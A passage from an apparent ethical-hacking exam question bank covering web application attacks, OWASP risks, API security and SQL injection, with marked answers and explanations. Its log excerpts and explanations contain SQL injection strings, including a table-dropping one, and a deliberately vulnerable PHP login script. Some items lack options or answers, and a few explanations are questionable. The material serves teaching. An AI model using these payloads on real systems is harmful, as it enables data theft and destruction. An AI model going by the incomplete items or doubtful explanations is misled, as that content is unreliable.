+ [ ] By using cross site scripting
+ [ ] By utilizing a buffer overflow attack
> **Explanation:**
> The situation in the question reflects an authorization attack using hidden fields. When a user selects anything on an HTML page, it stores the selection as form field values and sends it to the application as an HTTP request (GET or POST). HTML can store field values as hidden fields, which the browser does not display to the screen; rather, it collects and submits these fields as parameters during form submissions that the user can manipulate however they choose. The code sent to browsers does not have any security value; therefore, by manipulating the hidden values, the attacker can easily access the pages and run it in the browser.

964. An attacker identifies the kind of websites a target company/individual is frequently surfing and tests those particular websites to identify any possible vulnerabilities. When the attacker identifies the vulnerabilities in the website, the attacker injects malicious script/code into the web application that can redirect the webpage and download the malware onto the victim’s machine. After infecting the vulnerable web application, the attacker waits for the victim to access the infected web application. What kind of an attack is this?
+ [ ] Jamming attack
+ [x] Water hole attack
+ [ ] Denial-of-service attack
+ [ ] Phishing attack
> **Explanation:**
> In a watering hole attack, the attacker identifies the kind of websites a target company/individual frequently surfs and tests those particular websites to identify any possible vulnerabilities. When the attacker identifies the vulnerabilities in the website, the attacker injects malicious script/code into the web application that can redirect the webpage and download the malware onto the victim machine. After infecting the vulnerable web application, the attacker waits for the victim to access the infected web application. This attack is named as a watering hole attack since the attacker waits for the victim to fall into the trap, which is similar to a situation where a lion waits for its prey to arrive at waterhole to drink water. When the victim surfs through the infected website, the webpage redirects, leading to malware being downloaded onto the victim’s machine, compromising the machine and indeed compromising the network/organization.

965. Which of the following application security risks occurs as a result of failure in the implementation of proper key management systems or using old keys for protecting the sensitive data of an organization?
+ [ ] Software and data integrity failures
+ [ ] Injection
+ [x] Cryptographic failures
+ [ ] Security misconfiguration
> **Explanation:**
> + A03 – Injection: Injection flaws, such as SQL command injection and LDAP injection, occur when untrusted data are sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.
> + A08 – Software and Data Integrity Failures: Many applications are implemented with auto-update features. Such applications may download updates from unauthorized or previously trusted sources without conducting sufficient integrity checks. Attackers can take advantage of this flaw and load their own updates to distribute malware.
> + **A02 – Cryptographic Failures:** Many application developers fail to implement strong cryptographic keys, use old keys, or fail to enforce proper key management. In such cases, sensitive data can be transmitted in cleartext through HTTP. Attackers can leverage this flaw to steal or modify such weakly protected data to perform credit-card fraud, identity theft, or other crimes.
> + A05 – Security Misconfiguration: Security misconfiguration is the most common issue in web security, which is due in part to manual or ad hoc configuration (or no configuration at all); insecure default configurations; open S3 buckets; misconfigured HTTP headers; error messages containing sensitive information; and failure to patch or upgrade systems, frameworks, dependencies, and components in a timely manner (or at all). External entities can disclose internal files using the file URI handler, internal SMB file shares on unpatched Windows servers, internal port scanning, remote code execution, or DoS attacks such as the billion laughs attack.

966. Which of the following application security risks can be evolved as a result of downloading updates from unauthorized or previously trusted sources without conducting sufficient security checks?
+ [ ] Security logging and monitoring failures
+ [ ] Vulnerable and outdated components
+ [x] Software and data integrity failures
+ [ ] Identification and authentication failures
> **Explanation:**
> + A09 - Security Logging and Monitoring Failures: Security logging and monitoring failures occur via insufficient log monitoring, the local storage of logs, inadequate error messages, inappropriate alert mechanisms for failed-login attempts, or applications failing to identify threats in advance. Such vulnerabilities can leak sensitive information that can be leveraged by the attackers to compromise a system or account, tamper with credentials, or destroy data.
> + **A08 – Software and Data Integrity Failures:** Many applications are implemented with auto-update features. Such applications may download updates from unauthorized or previously trusted sources without conducting sufficient integrity checks. Attackers can take advantage of this flaw and load their own updates to distribute malware.
> + A06 – Vulnerable and Outdated Components: The software components need to be updated or patched in a timely manner based on the current risks, failing which they can leave serious vulnerabilities as they become outdated. An attack exploiting a vulnerable component can cause serious data loss or server takeover.
> + A07 – Identification and Authentication Failures: Application functions related to identification, authentication and session management are often implemented incorrectly, allowing attackers to launch brute-forcing, password spraying, and other automated attacks to compromise passwords, keys, or session tokens or to exploit other implementation flaws to assume the identities of other users.

967. The Open Web Application Security Project (OWASP) testing methodology addresses the need to secure web applications by providing which one of the following services?
+ [ ] Web application patches
+ [ ] A security certification for hardened web applications
+ [ ] An extensible security framework named COBIT
+ [x] A list of flaws and how to fix them
> **Explanation:**
> OWASP is an Open Web Application Security Project that assists organizations to purchase, develop, and maintain software tools, software applications, and knowledge-based documentation for web application security. It provides a set of tools and a knowledge base, which helps in protecting web applications and services. It is beneficial for system architects, developers, vendors, consumers, and security professionals who might work on designing, developing, deploying, and testing the security of web applications and web services.

968. During a penetration test, a tester finds that the web application being analyzed is vulnerable to XSS. Which of the following conditions must be met to exploit this vulnerability?
+ [x] The session cookies do not have the HttpOnly flag set.
+ [ ] The victim user should not have an endpoint security solution.
+ [ ] The web application does not have the secure flag set.
+ [ ] The victim's browser must have ActiveX technology enabled.
> **Explanation:**
> Generally, the XSS attacks target stealing session cookies. If for a web application the HttpOnly flag is not set then it is vulnerable XSS attack. A web server can defend against such attacks by setting the HttpOnly flag on a cookie it creates which is not accessible to the client. When a browser supports HttpOnly and detects a cookie containing the HttpOnly flag, the client side script tries to access the cookie then the browser returns back an empty string. This defends XSS attack by preventing the malicious code sending data to the attacker’s website.


## Web Application Hacking Methodology
969. Which of the following is a DNS interrogation tool that allows an attacker to retrieve information about the location and type of servers related to the target web infrastructure?
+ [ ] WAFW00F
+ [ ] Vega
+ [x] Domain Dossier
+ [ ] Halberd
> **Explanation:**
> + Halberd: Halberd can identify the real IP address of load balancers. When organizations implement load balancers, their real IP address is hidden behind a virtual IP address.
> + WAFW00F: allows one to identify and fingerprint WAFs protecting a website
> + Vega: Vega helps you to find and validate SQL injection, Cross-Site Scripting (XSS), inadvertently disclosed sensitive information, and other vulnerabilities
> + **Domain Dossier**: It is a DNS interrogation tool that provides information about the locations and types of servers.

970. Which of the following techniques allows an attacker to inject unusual characters into HTML code to bypass client-side controls?
+ [ ] Attack hidden form fields
+ [ ] Source-code review
+ [x] Evade XSS filters
+ [ ] Attack browser extensions
> **Explanation:**
> Some of the techniques to bypass the client-side controls are as follows:
> + Attack Hidden Form Fields: Identify hidden form fields on the web page and manipulate the tags and fields to exploit the web page before transmitting the data to the server.
> + Attack Browser Extensions: Attempt to intercept the traffic from the browser extensions or decompile the browser extensions to capture user data.
> + Perform Source Code Review: Perform source code review to identify vulnerabilities in the code that cannot be identified by traditional vulnerability scanning tools.
> + **Evade XSS Filters:** Evade XSS filters by injecting unusual characters into the HTML code.

971. Which of the following techniques is used by an attacker to enumerate usernames from a target web application?
+ [ ] Bypass SAML-based SSO
+ [ ] Cookie poisoning
+ [x] Verbose failure message
+ [ ] Dictionary attack
> **Explanation:**
> + **Verbose Failure Message:** In a typical login system, the user enters two fields, namely username and password. In some cases, an application will ask for additional information. If the user is trying to log in and fails, it implies that at least one field was incorrect. This provides grounds for an attacker to exploit the application.
> + Cookie Poisoning: It is a type of parameter tampering attack in which the attacker modifies the cookie contents to draw unauthorized information about a user and thus perform identity theft.
> + Bypass SAML-based SSO: Attackers take advantage of signature misconfigurations, session expiry timeouts, session replays, misdirected SAML messages, etc., to bypass SAML-based SSO authentication.
> + Dictionary Attack: It is password cracking technique.

972. Which of the following vulnerabilities occurs when an application adds files without the proper validation of inputs, thereby enabling an attacker to modify the input and embed path traversal characters?
+ [ ] Security misconfiguration
+ [x] Local file inclusion
+ [ ] Fileless malware
+ [ ] File fingerprinting
> **Explanation:**
> + Fileless Malware: Fileless malware, also known as non-malware, infects legitimate software, applications, and other protocols existing in the system to perform various malicious activities.
> + **Local File Inclusion**: LFI vulnerabilities enable attackers to add their own files on a server via a web browser. An LFI vulnerability occurs when an application adds files without proper validation of inputs, thereby enabling the attacker to modify the input and embed path traversal characters
> + File Fingerprinting: File fingerprinting is a process of computing the hash value for a given binary code to identify and track data across a network.
> + Security Misconfiguration: By exploiting misconfiguration vulnerabilities like unvalidated inputs, parameter/form tampering, improper error handling, insufficient transport layer protection, etc., attackers gain unauthorized access to default accounts, can read unused pages, can read/write unprotected files and directories, etc.

973. Which of the following techniques does an attacker use to replace the value of the data source parameter with that of a rogue Microsoft SQL server?
+ [ ] Connection pool DoS
+ [x] Hash stealing
+ [ ] Hijacking web credentials
+ [ ] Port scanning
> **Explanation:**
> + **Hash Stealing:** Replaces the value of the Data Source parameter with that of a Rogue Microsoft SQL Server and sets the values of username, data source, and integrated security.
> + Port Scanning: Try to connect to different ports by changing the value and seeing the error messages obtained.
> + Hijacking Web Credentials: Try to connect to the database using the web application system account instead of a user-provided set of credentials.
> + Connection Pool DoS: Attackers examine the connection pooling settings of the target application, construct a large malicious SQL query, and run multiple queries simultaneously to consume all the connections in the connection pool, causing database queries to fail for legitimate users.

974. Which of the following attacks is possible when an attacker executes .bat or .cmd files and changes the values by superimposing one or more operating-system commands through the request?
+ [ ] XML injection attack
+ [ ] SOAPAction spoofing
+ [ ] WS-address spoofing
+ [x] Parsing attack
> **Explanation:**
> + WS-Address Spoofing: WS-Address provides additional routing information in the SOAP header to support asynchronous communication. This technique allows the transmission of web service requests and response messages using different TCP connections. It is essential for long-running service requests where the calculation time of the server-side application exceeds the lifetime of a single TCP connection.
> + XML Injection Attack: Web applications sometimes use XML to store data such as user credentials in XML documents; attackers can parse and view such data using XPATH. XPATH defines the flow of the document and verifies user credentials, such as the username and password, to redirect them to a specific user account.
> + SOAPAction Spoofing: Every SOAP request message contains an operation that is executed by the application and is included as the first child element in the SOAP body. When SOAP messages are transmitted using HTTP, an additional HTTP header known as SOAPAction is used. The operation to be executed is included in the SOAPAction header. The header element informs the receiving web service about the operation present in the SOAP body without the need to perform XML parsing. Attackers can exploit this optimization to manipulate the operations included in the SOAPAction headers.
> + **Parsing attacks:** It exploit vulnerabilities and weaknesses in the processing capabilities of the XML parser to create a DoS attack or generate logical errors in web service request processing. A parsing attack is performed when an attacker succeeds in modifying a file request or string. The attacker changes the values by superimposing one or more operating system commands via the request. Parsing is possible when the attacker executes .bat (batch) or .cmd (command) files.

975. Which of the following built-in tools of Burp Suite is used for testing the randomness of session tokens?
+ [ ] Intruder tool
+ [ ] Application-aware spider
+ [x] Sequencer tool
+ [ ] Intercepting proxy
> **Explanation:**
> Burp Suite built-in tools
> + Intercepting proxy for inspecting and modifying traffic between your browser and the target application
> + Application-aware spider for crawling content and functionality
> + **Sequencer tool** for testing the randomness of session tokens
> + Intruder tool for performing customized attacks to find and exploit unusual vulnerabilities

976. What technique is used to perform a connection stream parameter pollution (CSPP) attack?
+ [ ] Adding multiple parameters with the same name in HTTP requests
+ [ ] Setting a user's session identifier (SID) to an explicit known value
+ [x] Injecting parameters into a connection string using semicolons as a separator
+ [ ] Inserting malicious Javascript code into input parameters
> **Explanation:**
> The attack called connection string parameter pollution (CSPP) specifically exploits the semicolon delimited database connection strings that are constructed dynamically based on the user inputs from web applications. So, injecting parameters into a connection string using semicolons as a separator is performed for a CSPP attack.

977. Which of the following automatically discover hidden content and functionality by parsing HTML form and client-side JavaScript requests and responses?
+ [ ] Firewalls
+ [ ] Banners
+ [ ] Proxies
+ [x] Web spiders
> **Explanation:**
> Web spiders automatically discover hidden content and functionality by parsing HTML form and client-side JavaScript requests and responses. Spiders are typically programmed to visit sites that have been submitted by their owners as new or updated. Entire sites or specific pages can be selectively visited and indexed. Spiders are called spiders because they usually visit many sites in parallel at the same time, with their “legs” spanning a large area of the “web.” Spiders can crawl through a site’s pages in several ways.

978. An attacker wants to exploit a webpage. From which of the following points does he start his attack process?
+ [ ] Identify server-side technologies
+ [ ] Identify server-side functionality
+ [x] Identify entry points for user input
+ [ ] Map the attack surface
> **Explanation:**
> The first step in analyzing a web app is to check for the application entry point, which can later serve as a gateway for attacks. One of the entry points includes the front-end web app that intercepts HTTP requests. Other web app entry points are user interfaces provided by webpages, service interfaces provided by web services, serviced components, and .NET remoting components. Attackers should review the generated HTTP request to identify the user input entry points.

979. Which of the following is a built-in tool of Burp Suite that is used for inspecting and modifying traffic between a browser and target application?
+ [ ] Application-aware
+ [ ] Sequencer tool
+ [ ] Intruder tool
+ [x] Intercepting proxy
> **Explanation:**
> Burp Suite built-in tools:
> + **Intercepting proxy** for inspecting and modifying traffic between your browser and the target application
> + Application-aware spider for crawling content and functionality
> + Intruder tool for performing customized attacks to find and exploit unusual vulnerabilities
> + Sequencer tool for testing the randomness of session tokens

980. In which of the following attack techniques does an attacker lure victims via email or a link that is constructed such that the loopholes of remote execution code become accessible, allowing the attacker to obtain access privileges equal to those of authorized users?
+ [ ] Frame injection
+ [ ] Request forgery attack
+ [x] ActiveX attack
+ [ ] Session fixation
> **Explanation:**
> + Request Forgery Attack: In a request forgery attack, attackers exploit the trust of a website or web application on a user's browser. The attack works by including a link on a page, which takes the user to an authenticated website.
> + Frame Injection: When scripts do not validate their input, attackers inject code through frames. This affects all the browsers and scripts that do not validate untrusted input. These vulnerabilities occur in HTML pages with frames. Another reason for this vulnerability is that web browsers support frame editing.
> + Session Fixation: Session fixation helps attackers hijack valid user sessions. They authenticate themselves using a known session ID and then use the known session ID to hijack a user-validated session. Thus, attackers trick users and access a genuine web server using an existing session ID value.
> + **ActiveX Attacks**: Attackers lure victims via email or via a link that is constructed such that the loopholes of remote execution code become accessible, allowing the attackers to obtain access privileges equal to those of authorized users.

984. Which of the following attacks allows an attacker to inject malicious content, modify the user´s online experience, and obtain unauthorized information?
+ [ ] Cross-site request forgery
+ [ ] Session brute-forcing
+ [x] Session poisoning
+ [ ] Session prediction
> **Explanation:**
> + Session prediction: It focuses on predicting session ID values that allow the attacker to bypass the authentication mechanism of an application. By analyzing and understanding the session ID generation process, the attacker can predict a valid session ID value and gain access to the application.
> + Session brute-forcing: An attacker brute-forces the session ID of a target user and uses it to log in as a legitimate user and gain access to the application.
> + **Session poisoning**: It allows an attacker to inject malicious content, modify the user´s online experience, and obtain unauthorized information.
> + Cross-Site Request Forgery: Cross-site request forgery (CSRF), also known as a one-click attack, occurs when a hacker instructs a user’s web browser to send a request to the vulnerable website through a malicious web page.

986. An attacker tries to enumerate the username and password of an account named “rini Mathew” on wordpress.com. On the first attempt, the attacker tried to login as “rini.mathews,” which resulted in the login failure message “invalid email or username.” On the second attempt, the attacker tried to login as “rinimathews,” which resulted in a message stating that the password entered for the username was incorrect, thus confirming that the username “rinimathews” exists. What is the attack that is performed by the attacker?
+ [x] Username enumeration
+ [ ] Man-in-the-middle
+ [ ] Brute-forcing
+ [ ] Phishing
> **Explanation:**
> In username enumeration, if the login error states that part of the user name and password is not correct, the attacker guesses the users of the application using the trial-and-error method. Here, an attacker tries to enumerate the username and password of “rini Mathew” on wordpress.com. On the first attempt, the attacker tried to login as “rini.mathews,” which resulted in the login failure message “invalid email or username.” On the second attempt, the attacker tried to login as “rinimathews,” which resulted in a message stating that the password entered for the username was incorrect, thus confirming that the username “rinimathews” exists. Some applications automatically generate account user names based on a sequence (e.g., “user101” and “user102”). Therefore, attackers can perform username enumeration by determining the appropriate sequence.


## Web API, Webhooks and Web Shell
987. Which of the following web-service APIs is programmed to generate, recover, modify, and erase different logs such as profiles, credentials, and business leads?
+ [x] SOAP API
+ [ ] RESTful API
+ [ ] JSON-RPC
+ [ ] XML-RPC
> **Explanation:**
> + **SOAP API**: SOAP is a web-based communication protocol that enables interactions between applications running on different platforms such as Windows, macOS, Linux, etc., via XML and HTTP. SOAP-based APIs are programmed to generate, recover, modify, and erase different logs such as profiles, credentials, and business leads.
> + RESTful API: RESTful API is a RESTful service that is designed using REST principles and HTTP communication protocols. RESTful is a collection of resources that use HTTP methods such as PUT, POST, GET, and DELETE. RESTful API is also designed to make applications independent to improve the overall performance, visibility, scalability, reliability, and portability of an application.
> + XML-RPC: Extensible Markup Language - Remote Procedure Call (XML-RPC) is a communication protocol that uses a specific XML format to transfer data, whereas SOAP uses proprietary XML to transfer data. It is simpler than SOAP and uses less bandwidth to transfer data.
> + JSON-RPC: JavaScript Object Notation – Remote Procedure Call (JSON-RPC) is a communication protocol that serves in the same way as XML-RPC but uses the JSON format instead of XML to transfer data.

988. Which of the following API vulnerabilities allows attackers to gain unauthorized access to API objects or perform actions such as viewing, updating, or deleting?

989. Which of the following protocols provides transport-level security for API messages to ensure confidentiality through encryption and integrity through signature?
+ [ ] NTP
+ [ ] IMAP
+ [ ] FTP
+ [x] SSL
> **Explanation:**
> + NTP: Network Time Protocol is designed to synchronize clocks of networked computers.
> + IMAP: Internet Message Access Protocol (IMAP) allows a client to access and manipulate electronic mail messages on a server.
> + FTP: File Transfer Protocol (FTP) enables clients to share files between computers in a network.
> + **SSL**: SSL provides transport-level security for API messages to ensure confidentiality through encryption and integrity through signature. Although SSL is used for security, in most API messages, only sensitive user data such as credit card details are encrypted, leaving other information in plaintext.

990. Which of the following parameters defines the level of access to an application to redirect a user agent to the authorization server?
+ [x] scope
+ [ ] redirect_uri
+ [ ] response_type
+ [ ] State
> **Explanation:**
> The user agent can be redirected to the authorization server by the client using the following parameters:
> + response _type: Code used for informing the server which permissions to execute
> + redirect_uri: URI where the authorization server redirects the user agent when the authorization code is provided
> + **scope**: Defines the level of access to the application
> + State: Opaque value used for security implementations. The value is also used for maintaining the state between request and callback

991. Which of the following API hacking techniques does not target the API or machine code and instead tricks users into divulging their credentials to perform further attacks?
+ [ ] Session replay attack
+ [ ] User spoofing
+ [ ] Reverse engineering
+ [x] Social engineering
> **Explanation:**
> + Reverse Engineering: Viewing the APIs from the developer’s viewpoint can be flawed because it checks only if an API is working as intended. Once it is deployed for the end-user experience, it may not work as it worked in the developer environment. This is what attackers often attempt to do while reverse-engineering the API. Attackers invoke APIs in reverse order to identify the flaws residing in the API that can be obfuscated in real-time usage.
> + User Spoofing: It is a process of concealing the original identity and masquerading as some other valid entity. In most cases, the attacker tries to expose himself as a legitimate user with special privileges and provides free data access to additional users to cause more damage. Attackers use details obtained from phishing or any other information leaking methods to masquerade as the original user.
> + Session Replay Attacks: Session replay attacks can be launched on websites and other sources that initiate and store sessions. These attacks are usually performed to obtain session IDs and replay them to the server.
> + **Social Engineering**: Social engineering techniques do not target the API or machine code, and are instead employed to trick users into divulging their credentials or other sensitive information to perform further attacks

992. Which of the following API security risks can be prevented by performing input validation, implementing a parameterized interface for processing inbound API requests, and limiting the number of records returned?

993. In which of the following attacks does an attacker repeatedly send some random input to a target API to generate error messages that reveal critical information?
+ [ ] Login/credential stuffing attack
+ [x] Fuzzing
+ [ ] Malicious input attack
+ [ ] Invalid input attack
> **Explanation:**
> + **Fuzzing**: Attackers use the fuzzing technique to repeatedly send some random input to the target API to generate error messages that reveal critical information. To perform fuzzing, attackers use automated scripts that send numerous requests with varying combinations of input parameters. Attackers use tools such as Fuzzapi to perform fuzzing on the target API
> + Invalid Input Attacks: In some scenarios, fuzzing is difficult to perform due to its structure. In such cases, attackers will give invalid inputs to the API, such as sending text in place of numbers, sending numbers in place of text, sending a greater number of characters than expected, and sending null characters, etc., to extract sensitive information from unexpected system behavior and error messages. At the same time, attackers also manipulate the HTTP headers and values targeting both API logic and the HTTP protocol.
> + Malicious Input Attacks: In the attack discussed above, attackers try to retrieve sensitive information from unexpected system behavior or error messages. A more dangerous attack is where the attackers inject malicious input directly to target both the API and its hosting infrastructure. To perform this attack, attackers employ malicious message parsers using XML.
> + Login/Credential Stuffing Attacks: Attackers often target login and validating systems because attacks on these systems are difficult to detect and stop using typical API security solutions. Attackers perform login attacks or credential stuffing attacks to exploit password reuse across multiple platforms. Most users use the same passwords to access different web services

994. In one of the following features of the RESTful API, the client end stores the state of the session, and the server is restricted to save data during request processing. Which is this feature?
+ [ ] Code on demand
+ [ ] Cacheable
+ [x] Stateless
+ [ ] Uniform interface
> **Explanation:**
> + Cacheable: The client should save responses (representations) in the cache. This feature can enhance API performance
> + Uniform Interface: Resources must be specifically and independently recognized via a single URL by employing basic protocol methods such as PUT, POST, GET, and DELETE, and it should be possible to modify a resource
> + **Stateless**: The client end stores the state of the session; the server is restricted to save data during the request processing
> + Code on Demand: An optional feature where the server can also provide temporary executable code to the client, through which the client’s functionality can be customized

995. Which of the following techniques is NOT a best practice for securing webhooks?
+ [ ] Use threaded requests to send multiple requests simultaneously
+ [ ] Ensure that event processing is idempotent
+ [ ] Use rate limiting on webhook calls in the web server
+ [x] Avoid validating the X-OP-Timestamp within the threshold of the current time
> **Explanation:**
> Some of the best practices for securing webhooks are as follows:
> + Use rate limiting on webhook calls in the web server to control the incoming and outgoing traffic
> + Compare the request timestamp X-Cld-Timestamp of the webhook with the current timestamp to prevent timing attacks
> + **Validate the X-OP-Timestamp within the threshold of the current time**
> + Ensure that the event processing is idempotent to prevent event receipts replication
> + Ensure that the webhook code responds with 200 OK (success) instead of 4xx or 5xx statuses in case of errors to ensure that the webhooks are not deactivated
> + Ensure that the webhook URL supports the HTTP HEAD method to retrieve meta-information without transferring the entire content
> + Use threaded requests to send multiple requests at the same time and to update data in the API rapidly
> + Make sure that the tokens are stored against the store_hash and not against the user data

996. Given below are the different steps associated with authorization code grant type for the exploitation of flawed scope validation:
	1.  When the victim attempts to open the attacker’s malicious client application, the attacker initiates a request to the OAuth service provider for access to the client’s mail address using the OpenID email scope.
	2.  Attacker registers for the OAuth service that is used by the targeted resource owner for their malicious client application.
	3.  Now, the attacker attains a valid access token to access and pocket additional data by using the escalated scope to make usual API calls to the client.
	4.  When the user provides authorization for their request, the attacker attains an authorization code as a response.
	5.  Now, the attacker initiates the scope escalation process for the targeted client by controlling their malicious client application to add additional scope.
	6.  After approval from the OAuth server, the attacker attains a new access token containing the newly added additional scope.

997. Given below are the various steps involved in the implicit grant type to exploit flawed scope validation:
	1.  After attaining the access token from the targeted client application, the attacker initiates a new request to its corresponding OAuth service provider with an altered scope **/userinfo**.
	2.  The attacker targets a vulnerable client application that utilizes an implicit grant-type process to attain access tokens from its clients through an open browser.
	3.  As the client has already granted permission for data access to the targeted client application, the attacker is now able to access additional information from the user until the OAuth server verifies and validates the scope parameter.
	4.  When the targeted client application obtains approval from its client and the corresponding access token is generated, the attacker attempts to pocket it.

998. Identify the API security layer that creates a mapper layer to enable the conversion of all the database records into different user-visible models.
+ [ ] Layer five
+ [ ] Layer two
+ [x] Layer four
+ [ ] Layer three
> **Explanation:**
> + Layer Three: In this layer, an SQL join must be used to query an SQL database using the data link layer based on API calls. This helps in ensuring that all the queries match the user responsible for the API call. Moreover, this verifies the user context, in contrast to its data stored by the SQL layer.
> + Layer Two: In this layer, middleware can be used by the API to provide a query plan by calling the data layer. The database layer declares a filter for the company ID before sending a request.
> + Layer Five: The response filter of the API verifies the models that are generated by the mapper layer above. After the response filter declares that the records match the user calling that API, it allows the user to observe a specific account. This layer discards the data models without clearly flagging the account of a customer by double-checking the work of other layers.
> + **Layer Four:** This layer creates a mapper layer that enables the conversion of all the database records into different user-visible models. This technique can be used to prevent sensitive data such as implementation details from the public or customers.

999. Which of the following practices helps security experts secure web APIs from various attacks?
+ [ ] Ensure that all the requests made from stateful communication APIs
+ [ ] Do not implement a pagination technique
+ [ ] Use client-generated tokens embedded in HTML as hidden fields for validating the incoming request
+ [x] Use SOAP APIs with in-built security features instead of conventional design-based REST APIs
> **Explanation:**
> Various best practices for securing APIs against cyberattacks are as follows:
> + Use server-generated tokens embedded in HTML as hidden fields for validating the incoming request and to check if it is from an authenticated source.
> + Implement a pagination technique that can divide a single response into several fragments so that the payloads are not oversized.
> + **Use SOAP APIs with in-built security features instead of conventional design-based REST APIs.**
> + Ensure that all the requests made from stateless communication APIs such as REST API are authorized separately, even if they originated from the same user.
> + Implement multi-factor authentication (MFA) and use authentication protocols such as AppToken, OAuth2, and OpenID Connect to authenticate the users and applications in the API.

	[20/Mar/2011:10:49:07] "GET /login.php?user=test'+oR+3>2%20-- HTTP/1.1" 200 9958  
	[20/Mar/2011:10:51:02] "GET /login.php?user=admin';%20-- HTTP/1.1" 200 9978  
	```
	The administrator decides to further investigate and analyze the source code of the login.php file:  
	```
	php  
	include('../../config/db_connect.php');  
	$user = $_GET['user'];  
	$pass = $_GET['pass'];  
	$sql = "SELECT * FROM USERS WHERE username = '$user' AND password = '$pass'";  
	$result = mysql_query($sql) or die ("couldn't execute query");  
	if (mysql_num_rows($result) != 0) echo 'Authentication granted!';  
	else echo 'Authentication failed!';  
	?>  
	```
	Based on the source code analysis, the analyst concludes that the login.php script is vulnerable to:
+ [ ] Directory traversal
+ [ ] LDAP injection
+ [ ] Command injection
+ [x] SQL injection
> **Explanation:**
> + An SQL injection query exploits the normal execution of SQL. An attacker submits a request with values that will execute normally but will return data from the database that the attacker wants. The attacker is able to submit these malicious values because of the inability of the application to filter them before processing. If the values submitted by the users are not properly validated, then there is a potential for an SQL injection attack on the application.
> + Consider the query ‘ if (mysql_num_rows($result) != 0) echo 'Authentication granted!'; a close examination of this query reveals that the condition in the where clause will always be true. This query successfully executes as there is no syntax error, and it does not violate the normal execution of the query.

1071. Bank of Timbuktu is a medium-sized, regional financial institution in Timbuktu. The bank has recently deployed a new Internet-accessible web application. Customers can access their account balances, transfer money between accounts, pay bills, and conduct online financial business using a web browser.
	John Stevens is in charge of information security at the Bank of Timbuktu. After one month in production, several customers have complained about the Internet-enabled banking application. Strangely, the account balances of many of the bank’s customers have been changed! However, money has not been removed from the bank; instead, money is transferred between accounts. Given this attack profile, John Stevens reviewed the web application’s logs and found the following entries:
	```
	Attempted login of unknown user: johnm
	Attempted login of unknown user: susaR
	Attempted login of unknown user: sencat
	Attempted login of unknown user: pete'';
	Attempted login of unknown user: ' or 1=1--
	Attempted login of unknown user: '; drop table logins--
	Login of user jason, sessionID= 0x75627578626F6F6B
	Login of user daniel, sessionID= 0x98627579539E13BE
	Login of user rebecca, sessionID= 0x9062757944CCB811
	Login of user mike, sessionID= 0x9062757935FB5C64
	Transfer Funds user jason
	Pay Bill user mike
	Logout of user mike
	```
	What kind of attack did the hacker attempt to carry out at the bank?
+ [ ] Brute force attack in which the hacker attempted guessing login IDs and passwords from password-cracking tools.
+ [ ] The hacker attempted session hijacking, in which the hacker opened an account with the bank, then logged in to receive a session ID, guessed the next ID, and took over Jason’s session.
+ [x] The hacker first attempted logins with suspected user names, and then used SQL injection to gain access to valid bank login IDs.
+ [ ] The hacker used a generator module to pass results to the webserver and exploited web application CGI vulnerability.
> **Explanation:**
> + Programmers use sequential SQL commands with client-supplied parameters, making it easier for attackers to inject commands. SQL injection is a technique used to take advantage of unsanitized input vulnerabilities to pass SQL commands through a web application for execution by a backend database. In this technique, the attacker injects malicious SQL queries into the user input form, either to gain unauthorized access to a database or to retrieve information directly from the database. It is a flaw in web applications and is not an issue with the database or the webserver.
> 
> + An HTML form that receives and passes information posted by the user to the active server pages (ASP) script running on an IIS webserver is the best example of SQL injection. The information passed is the username and password. To create an SQL injection query, an attacker may submit the following values in application input fields, such as the username and password field.
> 	```
> 	Username: Blah' or 1=1 --
> 	Password: Springfield
> 	```
> 	As a part of normal execution of query, these input values will replace placeholders, and the query will appear as follows:
> 	`SELECT Count(*) FROM Users WHERE UserName='Blah' or 1=1 --' AND Password='Springfield';`
> 
> + Session hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers. Since most authentication occurs only at the start of a TCP session, it allows the attacker to gain access to a machine. Attackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud, and so on.
> 
> + Common gateway interface (CGI) offers a standard protocol for webservers to execute programs that execute like Console applications (also called command-line interface programs) running on a server that generates webpages dynamically.
> 
> + A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data.

1072. SQL injection attacks do not exploit a specific software vulnerability; instead they target websites that do not follow secure coding practices for accessing and manipulating data stored in a relational database.
+ [x] True
+ [ ] False
> **Explanation:**
> + The question tests the student understanding of the root cause of SQLi attacks.
> + Web applications use various database technologies as a part of their functionality. Some relational databases used for developing web applications include Microsoft SQL Server, Oracle, IBM DB2, and the open-source MySQL. Developers sometimes unknowingly neglect secure coding practices when using these technologies, which makes the applications vulnerable to SQL injection attacks.

1073. Which of the following system table does MS SQL Server database use to store metadata? Hackers can use this system table to acquire database schema information to further compromise the database.
+ [ ] sysdbs
+ [x] sysobjects
+ [ ] syscells
+ [ ] sysrows
> **Explanation:**
> SYSOBJECTS contains a row for every object that has been created in the database, including stored procedures, views, and user tables. Rest of the options does not exist.

1074. Which of the following methods carries the requested data to the webserver as a part of the message body?
+ [x] HTTP POST
+ [ ] IBM DB2
+ [ ] Cold fusion
+ [ ] HTTP GET
> **Explanation:**
> An HTTP POST request is one of the methods used to carry the requested data to the webserver. Unlike the HTTP GET method, an HTTP POST request carries the requested data as a part of the message body. Thus, it is considered more secure than HTTP GET.

1075. Which of the following is the most effective technique in identifying vulnerabilities or flaws in the web page code?
+ [ ] Packet analysis
+ [ ] Data analysis
+ [ ] Traffic analysis
+ [x] Code analysis
> **Explanation:**
> Code analysis or code review is the most effective technique in identifying vulnerabilities or flaws in the code. Traffic analysis refers to analyzing the network traffic whereas packet analysis refers to analyzing the network packets that have been transferred in a network. Data analysis refers to analyzing the data. This data can be anything, depending on the situation.

1076. An attacker injects the following SQL query:
	`blah' AND 1=(SELECT COUNT(*) FROM mytable); --`
	What is the intention of the attacker?
+ [ ] Deleting a table
+ [x] Identifying the table name
+ [ ] Adding new records
+ [ ] Updating table
> **Explanation:**
> + When an attacker injects the following SQL query:
> `blah' AND 1=(SELECT COUNT(*) FROM mytable); --` His intention is to identify the table name.
> For example: `SELECT jb-email, jb-passwd, jb-login_id, jb-last_name FROM table WHERE jb-email = 'blah' AND 1=(SELECT COUNT(*) FROM mytable); --';`
> 
> + For updating table, he shall use :
> `blah'; UPDATE jb-customers SET jbemail= 'info@certifiedhacker.com' WHERE email='jason@springfield.com; --`
> 
> + For Adding New Records,he shall use :
> `blah'; INSERT INTO jb-customers ('jb-email','jb-passwd','jblogin_id','jb-last_name') VALUES ('jason@springfield.com','hello',' jason','jason springfield');--`
> 
